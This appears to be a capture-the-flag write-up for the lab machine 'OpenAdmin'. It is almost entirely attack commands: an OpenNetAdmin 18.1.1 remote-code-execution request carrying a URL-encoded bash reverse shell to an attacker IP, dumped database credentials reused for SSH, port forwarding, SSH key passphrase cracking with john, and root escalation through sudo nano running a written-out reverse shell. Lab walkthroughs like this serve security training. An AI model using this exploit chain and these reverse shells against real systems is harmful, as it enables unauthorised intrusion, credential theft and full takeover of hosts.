# OpenAdmin

### Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```

### Web Enum

```
http://10.10.10.171/ -> Apache2 Ubuntu Default Page

http://10.10.10.171/artwork/
	/about.html -> About Us (nth)
	/blog.html -> Our Blog Posts (nth)
	/contact.html -> Contact Us (nth)
	/main.html -> found templates 'Colorlib'
	/services.html -> Our Services (nth)
	/single.html -> found name 'James Miller'

http://10.10.10.171/music/
	/blog.html -> found name 'Alan Smith'
	/category.html -> Live Concert Playlist
	/contact.html -> found email 'contact@solmusic.com'
	/main.html -> found templates 'Colorlib'
	/playlist.html -> play list

http://10.10.10.171/sierra/
	/about-us.html -> about us
	/blog.html -> blog
	/contact.html -> contact
	/elements.html -> elements
	/portfolio.html -> photots
	/service.html -> service
	/vendors/revolution/ -> blank
		/php/ -> nth

http://10.10.10.171/ona/ 

http://10.10.10.171/ona/login.php -> OpenNetAdmin Login admin:admin
```

### Exploitation

```bash
# searchsploit 18.1.1
OpenNetAdmin 18.1.1 - Remote Code Execution  | php/webapps/47691.sh

# encode bash -c 'bash -i >& /dev/tcp/10.10.14.23/12345 0>&1'
export cmd="%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%32%33%2f%31%32%33%34%35%20%30%3e%26%31%27"
export $URL="http://10.10.10.171/ona/"

# call reverse shell 
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$cmd;echo \"END\"&xajaxargs[]=ping" $URL

```

### Priv Esc

```bash
# found db credentail
/var/www/ona/local/configdatabase_settings.inc.php
'db_type' => 'mysqli',
'db_host' => 'localhost',
'db_login' => 'ona_sys',
'db_passwd' => 'n1nj4W4rri0R!',
'db_database' => 'ona_default',
'db_debug' => false,

# login jimmy:n1nj4W4rri0R! (passowrd reuse)
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" jimmy@$IP

# found hash on /var/www/internal/index.php
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1:Revealed

# found internal web interface and require port forwarding
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

# port forwarding
ssh -N -L 52846:localhost:52846 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" jimmy@$IP

# login internal web server with jimmy:Revealed and get ssh key

# crack passphase -> bloodninjas
sh2john joanna_key > joanna_key_crack
john --wordlist=/usr/share/wordlists/rockyou.txt joanna_key_crack

# login joanna
(ALL) NOPASSWD: /bin/nano /opt/priv

# write reverse shell on /opt/priv
bash -i >& /dev/tcp/10.10.14.23/12345 0>&1

# execute shell code as root by nano
sudo /bin/nano /opt/priv
[ctrl + r]
[ctrl + x]
chmod +x /opt/priv; /opt/priv # Command to execute: chmod +x /opt/priv; /opt/priv

```
